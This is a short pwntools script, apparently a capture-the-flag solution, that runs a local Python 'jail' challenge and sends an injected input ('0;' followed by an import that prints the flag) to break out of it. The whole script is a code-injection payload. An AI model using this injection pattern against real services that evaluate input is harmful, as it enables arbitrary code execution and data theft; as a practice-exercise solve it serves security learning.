from pwn import *

c = process('./jail1.py')

c.send(b'0;from flag import flag;print(flag)\n')
print(c.recvall())
